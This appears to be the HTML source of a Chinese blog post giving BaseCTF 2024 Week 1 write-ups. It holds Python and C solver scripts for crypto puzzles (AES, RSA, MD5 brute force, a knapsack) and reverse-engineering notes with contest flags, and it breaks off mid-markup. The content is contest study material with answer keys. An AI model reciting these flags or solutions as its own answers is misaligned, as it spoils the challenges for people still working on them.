@@ -1,0 +1,890 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/biaotou.png">
+  <link rel="icon" href="/img/biaotou.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="orange">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Week1Cryptohello_crypto12345678910111213141516171819from Crypto.Util.number import long_to_bytesfrom Crypto.Cipher import AESfrom Crypto.Util.Padding import unpad# 已知的 key1 和密文key1 &#x3D; 20879775995328839">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Basectf2024">
+<meta property="og:url" content="http://example.com/2024/08/21/basectf/basectf2024/index.html">
+<meta property="og:site_name" content="0raN9e的笔记">
+<meta property="og:description" content="Week1Cryptohello_crypto12345678910111213141516171819from Crypto.Util.number import long_to_bytesfrom Crypto.Cipher import AESfrom Crypto.Util.Padding import unpad# 已知的 key1 和密文key1 &#x3D; 20879775995328839">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/basectf/basectf2024/http1.png">
+<meta property="og:image" content="http://example.com/images/basectf/basectf2024/http2.png">
+<meta property="og:image" content="http://example.com/images/basectf/basectf2024/http3.png">
+<meta property="og:image" content="http://example.com/images/basectf/basectf2024/%E5%96%B5%E5%96%B5%E5%96%B5.png">
+<meta property="og:image" content="http://example.com/images/basectf/basectf2024/md5.png">
+<meta property="og:image" content="http://example.com/images/basectf/basectf2024/aura.png">
+<meta property="og:image" content="http://example.com/images/basectf/basectf2024/haibao1.png">
+<meta property="og:image" content="http://example.com/images/basectf/basectf2024/haibao2.png">
+<meta property="og:image" content="http://example.com/images/basectf/basectf2024/haibao3.png">
+<meta property="og:image" content="http://example.com/images/basectf/basectf2024/haibao4.png">
+<meta property="og:image" content="http://example.com/images/basectf/basectf2024/haibao5.png">
+<meta property="og:image" content="http://example.com/images/basectf/basectf2024/haibao6.png">
+<meta property="og:image" content="http://example.com/images/basectf/basectf2024/haibao7.png">
+<meta property="og:image" content="http://example.com/images/basectf/basectf2024/haibao8.png">
+<meta property="og:image" content="http://example.com/images/basectf/basectf2024/haibao9.png">
+<meta property="og:image" content="http://example.com/images/basectf/basectf2024/haibao10.png">
+<meta property="article:published_time" content="2024-08-21T07:00:00.000Z">
+<meta property="article:modified_time" content="2024-08-21T06:59:37.283Z">
+<meta property="article:author" content="orange">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/images/basectf/basectf2024/http1.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>Basectf2024 - 0raN9e的笔记</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"y20YQnBmfM0DqawGjwxeWhCq-gzGzoHsz","app_key":"Y55Ca02EpnhoEzDEjf7sqVwX","server_url":null,"path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>橙子</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Basectf2024"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-08-21 15:00" pubdate>
+          2024年8月21日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          17 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Basectf2024</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2024年8月21日 下午
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h1><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="hello-crypto"><a href="#hello-crypto" class="headerlink" title="hello_crypto"></a>hello_crypto</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> Crypto.Util.number import long_to_bytes<br><span class="hljs-keyword">from</span> Crypto.Cipher import AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding import unpad<br><br><span class="hljs-comment"># 已知的 key1 和密文</span><br>key1 = 208797759953288399620324890930572736628<br>ciphertext = b<span class="hljs-string">&#x27;U\xcd\xf3\xb1 r\xa1\x8e\x88\x92Sf\x8a`Sk],\xa3(i\xcd\x11\xd0D\x1edd\x16[&amp;\x92@^\xfc\xa9(\xee\xfd\xfb\x07\x7f:\x9b\x88\xfe&#123;\xae&#x27;</span><br><br><span class="hljs-comment"># 将 key1 转换为字节格式</span><br>key = long_to_bytes(key1)<br><br><span class="hljs-comment"># 创建 AES 解密器</span><br>my_aes = AES.new(<span class="hljs-attribute">key</span>=key, <span class="hljs-attribute">mode</span>=AES.MODE_ECB)<br><br><span class="hljs-comment"># 解密并去除填充</span><br>decrypted_data = unpad(my_aes.decrypt(ciphertext), AES.block_size)<br><br><span class="hljs-comment"># 打印解密后的数据</span><br><span class="hljs-built_in">print</span>(decrypted_data)<br></code></pre></td></tr></table></figure>
+
+<h3 id="ez-rsa"><a href="#ez-rsa" class="headerlink" title="ez_rsa"></a>ez_rsa</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes, inverse<br><span class="hljs-keyword">import</span> gmpy2<br><br><span class="hljs-comment"># 已知的 n, not_phi 和 c</span><br>n = <span class="hljs-number">96557532552764825748472768984579682122986562613246880628804186193992067825769559200526147636851266716823209928173635593695093547063827866240583007222790344897976690691139671461342896437428086142262969360560293350630096355947291129943172939923835317907954465556018515239228081131167407674558849860647237317421</span><br>not_phi = <span class="hljs-number">96557532552764825748472768984579682122986562613246880628804186193992067825769559200526147636851266716823209928173635593695093547063827866240583007222790384900615665394180812810697286554008262030049280213663390855887077502992804805794388166197820395507600028816810471093163466639673142482751115353389655533205</span><br>c = <span class="hljs-number">37077223015399348092851894372646658604740267343644217689655405286963638119001805842457783136228509659145024536105346167019011411567936952592106648947994192469223516127472421779354488529147931251709280386948262922098480060585438392212246591935850115718989480740299246709231437138646467532794139869741318202945</span><br>e = <span class="hljs-number">65537</span><br><br><span class="hljs-comment"># Step 1: 从 n 和 not_phi 计算出 p 和 q</span><br><span class="hljs-comment"># p*q = n, (p+2)*(q+2) = not_phi</span><br><span class="hljs-comment"># 展开得到 pq + 2p + 2q + 4 = not_phi</span><br><span class="hljs-comment"># p + q = (not_phi - n - 4) / 2</span><br><br>s = (not_phi - n - <span class="hljs-number">4</span>) // <span class="hljs-number">2</span><br><span class="hljs-comment"># 使用求解二次方程的方法解出 p 和 q</span><br><span class="hljs-comment"># x^2 - sx + n = 0</span><br>discriminant = gmpy2.isqrt(s*s - <span class="hljs-number">4</span>*n)<br>p = (s + discriminant) // <span class="hljs-number">2</span><br>q = (s - discriminant) // <span class="hljs-number">2</span><br><br><span class="hljs-comment"># Step 2: 计算 φ(n)</span><br>phi = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># Step 3: 计算私钥 d</span><br>d = inverse(e, phi)<br><br><span class="hljs-comment"># Step 4: 解密密文</span><br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br><br><span class="hljs-comment"># Step 5: 将解密的数字转换为字符串</span><br>decrypted_message = long_to_bytes(m)<br><br><span class="hljs-comment"># 打印解密后的数据</span><br><span class="hljs-built_in">print</span>(decrypted_message)<br></code></pre></td></tr></table></figure>
+
+<h3 id="你会算md5吗"><a href="#你会算md5吗" class="headerlink" title="你会算md5吗"></a>你会算md5吗</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br><span class="hljs-comment"># Helper function to compute MD5 hash of a string</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md5_hash</span>(<span class="hljs-params">text</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(text.encode()).hexdigest()<br><br><span class="hljs-comment"># Possible characters</span><br>possible_chars = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&amp;*()_+-=[]&#123;&#125;|;:,.&lt;&gt;?/&quot;</span><br><br><span class="hljs-comment"># Given hashes</span><br>hashes = [<br>    <span class="hljs-string">&#x27;9d5ed678fe57bcca610140957afab571&#x27;</span>, <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>,<br>    <span class="hljs-string">&#x27;03c7c0ace395d80182db07ae2c30f034&#x27;</span>, <span class="hljs-string">&#x27;e1671797c52e15f763380b45e841ec32&#x27;</span>,<br>    <span class="hljs-string">&#x27;0d61f8370cad1d412f80b84d143e1257&#x27;</span>, <span class="hljs-string">&#x27;b9ece18c950afbfa6b0fdbfa4ff731d3&#x27;</span>,<br>    <span class="hljs-string">&#x27;800618943025315f869e4e1f09471012&#x27;</span>, <span class="hljs-string">&#x27;f95b70fdc3088560732a5ac135644506&#x27;</span>,<br>    <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>, <span class="hljs-string">&#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;</span>,<br>    <span class="hljs-string">&#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;</span>, <span class="hljs-string">&#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;</span>,<br>    <span class="hljs-string">&#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;</span>, <span class="hljs-string">&#x27;eccbc87e4b5ce2fe28308fd9f2a7baf3&#x27;</span>,<br>    <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>, <span class="hljs-string">&#x27;e4da3b7fbbce2345d7772b0674a318d5&#x27;</span>,<br>    <span class="hljs-string">&#x27;336d5ebc5436534e61d16e63ddfca327&#x27;</span>, <span class="hljs-string">&#x27;eccbc87e4b5ce2fe28308fd9f2a7baf3&#x27;</span>,<br>    <span class="hljs-string">&#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;</span>, <span class="hljs-string">&#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;</span>,<br>    <span class="hljs-string">&#x27;45c48cce2e2d7fbdea1afc51c7c6ad26&#x27;</span>, <span class="hljs-string">&#x27;336d5ebc5436534e61d16e63ddfca327&#x27;</span>,<br>    <span class="hljs-string">&#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;</span>, <span class="hljs-string">&#x27;8f14e45fceea167a5a36dedd4bea2543&#x27;</span>,<br>    <span class="hljs-string">&#x27;1679091c5a880faf6fb5e6087eb1b2dc&#x27;</span>, <span class="hljs-string">&#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;</span>,<br>    <span class="hljs-string">&#x27;336d5ebc5436534e61d16e63ddfca327&#x27;</span>, <span class="hljs-string">&#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;</span>,<br>    <span class="hljs-string">&#x27;8277e0910d750195b448797616e091ad&#x27;</span>, <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>,<br>    <span class="hljs-string">&#x27;c81e728d9d4c2f636f067f89cc14862c&#x27;</span>, <span class="hljs-string">&#x27;336d5ebc5436534e61d16e63ddfca327&#x27;</span>,<br>    <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>, <span class="hljs-string">&#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;</span>,<br>    <span class="hljs-string">&#x27;c9f0f895fb98ab9159f51fd0297e236d&#x27;</span>, <span class="hljs-string">&#x27;e1671797c52e15f763380b45e841ec32&#x27;</span>,<br>    <span class="hljs-string">&#x27;e1671797c52e15f763380b45e841ec32&#x27;</span>, <span class="hljs-string">&#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;</span>,<br>    <span class="hljs-string">&#x27;8277e0910d750195b448797616e091ad&#x27;</span>, <span class="hljs-string">&#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;</span>,<br>    <span class="hljs-string">&#x27;45c48cce2e2d7fbdea1afc51c7c6ad26&#x27;</span>, <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>,<br>    <span class="hljs-string">&#x27;c9f0f895fb98ab9159f51fd0297e236d&#x27;</span>, <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>,<br>    <span class="hljs-string">&#x27;cbb184dd8e05c9709e5dcaedaa0495cf&#x27;</span><br>]<br><br><span class="hljs-comment"># Find corresponding characters</span><br>decoded_flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> hash_val <span class="hljs-keyword">in</span> hashes:<br>    found = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> possible_chars:<br>        <span class="hljs-keyword">if</span> md5_hash(char) == hash_val:<br>            decoded_flag += char<br>            found = <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> found:<br>        decoded_flag += <span class="hljs-string">&#x27;?&#x27;</span>  <span class="hljs-comment"># Use a placeholder if hash not found</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Decoded flag: <span class="hljs-subst">&#123;decoded_flag&#125;</span>&quot;</span>)<br><br></code></pre></td></tr></table></figure>
+
+<h3 id="十七倍"><a href="#十七倍" class="headerlink" title="十七倍"></a>十七倍</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> cipher[] = &#123;<br>        <span class="hljs-number">98</span>, <span class="hljs-number">113</span>, <span class="hljs-number">163</span>, <span class="hljs-number">181</span>, <span class="hljs-number">115</span>, <span class="hljs-number">148</span>, <span class="hljs-number">166</span>, <span class="hljs-number">43</span>, <span class="hljs-number">9</span>, <span class="hljs-number">95</span>,<br>        <span class="hljs-number">165</span>, <span class="hljs-number">146</span>, <span class="hljs-number">79</span>, <span class="hljs-number">115</span>, <span class="hljs-number">146</span>, <span class="hljs-number">233</span>, <span class="hljs-number">112</span>, <span class="hljs-number">180</span>, <span class="hljs-number">48</span>, <span class="hljs-number">79</span>,<br>        <span class="hljs-number">65</span>, <span class="hljs-number">181</span>, <span class="hljs-number">113</span>, <span class="hljs-number">146</span>, <span class="hljs-number">46</span>, <span class="hljs-number">249</span>, <span class="hljs-number">78</span>, <span class="hljs-number">183</span>, <span class="hljs-number">79</span>, <span class="hljs-number">133</span>,<br>        <span class="hljs-number">180</span>, <span class="hljs-number">113</span>, <span class="hljs-number">146</span>, <span class="hljs-number">148</span>, <span class="hljs-number">163</span>, <span class="hljs-number">79</span>, <span class="hljs-number">78</span>, <span class="hljs-number">48</span>, <span class="hljs-number">231</span>, <span class="hljs-number">77</span><br>    &#125;;<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> flag[<span class="hljs-number">40</span>];<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> inverse = <span class="hljs-number">241</span>;  <span class="hljs-comment">// 17&#x27;s modular inverse modulo 256</span><br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">40</span>; i++) &#123;<br>        flag[i] = (cipher[i] * inverse) % <span class="hljs-number">256</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// Print the decrypted flag</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Decrypted flag: &quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">40</span>; i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, flag[i]);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<h3 id="babypack"><a href="#babypack" class="headerlink" title="babypack"></a>babypack</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br><span class="hljs-comment"># 从文件中读取a和c的值</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;D:\\谷歌\\babypack\\output.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    lines = f.readlines()<br>    a = <span class="hljs-built_in">eval</span>(lines[<span class="hljs-number">0</span>].strip().split(<span class="hljs-string">&#x27;=&#x27;</span>)[<span class="hljs-number">1</span>])<br>    c = <span class="hljs-built_in">int</span>(lines[<span class="hljs-number">1</span>].strip().split(<span class="hljs-string">&#x27;=&#x27;</span>)[<span class="hljs-number">1</span>])<br><br>bin_m = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    <span class="hljs-keyword">if</span> c &gt;= a[i]:<br>        bin_m.append(<span class="hljs-string">&#x27;1&#x27;</span>)<br>        c -= a[i]<br>    <span class="hljs-keyword">else</span>:<br>        bin_m.append(<span class="hljs-string">&#x27;0&#x27;</span>)<br><br><span class="hljs-comment"># 将bin_m转换回整数m</span><br>m = <span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(bin_m), <span class="hljs-number">2</span>)<br><br><span class="hljs-comment"># 将m转换回flag</span><br>flag = long_to_bytes(m)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="You-are-good-at-IDA"><a href="#You-are-good-at-IDA" class="headerlink" title="You are good at IDA"></a>You are good at IDA</h3><p>按照shift和f12进行查找最后拼接就行了</p>
+<p><strong>BaseCTF{Y0u_4Re_900d_47_id4}</strong></p>
+<h3 id="UPX-mini"><a href="#UPX-mini" class="headerlink" title="UPX mini"></a>UPX mini</h3><p>QmFzZUNURntIYXYzX0BfZzBvZF90MW0zISEhfQ&#x3D;&#x3D;</p>
+<p>base64解密</p>
+<p><strong>BaseCTF{Hav3_@_g0od_t1m3!!!}</strong></p>
+<h3 id="ez-maze"><a href="#ez-maze" class="headerlink" title="ez_maze"></a>ez_maze</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 